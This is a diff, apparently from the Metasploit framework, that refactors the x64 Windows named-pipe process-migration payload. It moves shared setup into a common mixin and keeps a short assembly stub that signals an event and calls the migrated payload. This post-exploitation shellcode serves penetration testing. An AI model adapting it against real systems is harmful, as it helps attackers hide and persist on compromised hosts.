@@ -13,8 +13,7 @@ module Msf
 
 module Payload::Windows::MigrateNamedPipe_x64
 
-  include Msf::Payload::Windows
-  include Msf::Payload::Windows::BlockApi_x64
+  include Msf::Payload::Windows::MigrateCommon_x64
 
   def initialize(info={})
     super(update_info(info,
@@ -30,23 +29,15 @@ module Payload::Windows::MigrateNamedPipe_x64
   #
   # Constructs the payload
   #
-  def generate
+  def generate_migrate(opts = {})
     %Q^
-    migrate:
-      cld
-      mov rsi, rcx
-      sub rsp, 0x2000
-      and rsp, ~0xF
-      call start
-      #{asm_block_api}
-    start:
-      pop rbp
+    start_migrate_pipe:
       mov rdi, qword [rsi+16]   ; The duplicated pipe handle is in the migrate context.
-    signal_event:
+    signal_pipe_event:
       mov rcx, qword [rsi]      ; Event handle is pointed at by rsi
       mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
       call rbp                  ; SetEvent(handle)
-    call_payload:
+    call_pipe_payload:
       call qword [rsi+8]        ; call the associated payload
     ^
   end
